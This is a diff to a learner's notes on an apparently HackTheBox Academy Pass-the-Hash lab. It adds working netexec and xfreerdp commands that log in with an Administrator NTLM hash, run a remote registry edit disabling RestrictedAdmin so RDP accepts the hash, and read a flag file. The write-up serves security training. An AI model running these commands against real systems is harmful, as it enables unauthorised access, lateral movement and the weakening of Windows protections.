@@ -2303,13 +2303,34 @@ UAC (User Account Control) limits local users' ability to perform remote adminis
 
 These settings are only for local administrative accounts. If we get access to a domain account with administrative rights on a computer, we can still use Pass the Hash with that computer. If you want to learn more about LocalAccountTokenFilterPolicy, you can read Will Schroeder's blog post [Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy](https://posts.specterops.io/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy-506c25a7c167).
 ## Exercise
-### Access the target machine using any Pass-the-Hash tool. Submit the contents of the file located at C:\pth.txt. Authenticate to 10.129.237.245 (ACADEMY-PWATTACKS-LM-MS01), with user "Administrator" and password "30B3783CE2ABF1AF70F77D0660CF3453"
+### Access the target machine using any Pass-the-Hash tool. Submit the contents of the file located at C:\pth.txt. Authenticate to 10.129.239.28 (ACADEMY-PWATTACKS-LM-MS01), with user "Administrator" and password "30B3783CE2ABF1AF70F77D0660CF3453"
 
 ```shell
-netexec smb 10.129.237.245 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
+netexec smb 10.129.239.28 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
 # WE GOT A SHELL
 type pth.txt # flag
 ```
+### Try to connect via RDP using the Administrator hash. What is the name of the registry value that must be set to 0 for PTH over RDP to work? Change the registry key value and connect using the hash with RDP. Submit the name of the registry value name as the answer.
 
+```shell
+xfreerdp /v:10.129.239.28 /u:Administrator /dynamic-resolution /pth:30B3783CE2ABF1AF70F77D0660CF3453
+```
+
+![](./src/10_src/RDP_error.png)
+
+So, we need to change the registry to permit the connection via RDP.
+
+```shell
+netexec smb 10.129.239.28 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
+```
+
+And then we can acces via RDP:
+
+```shell
+# again
+xfreerdp /v:10.129.239.28 /u:Administrator /dynamic-resolution /pth:30B3783CE2ABF1AF70F77D0660CF3453
+```
+
+![](./src/10_src/RDP_success.png)
 
 
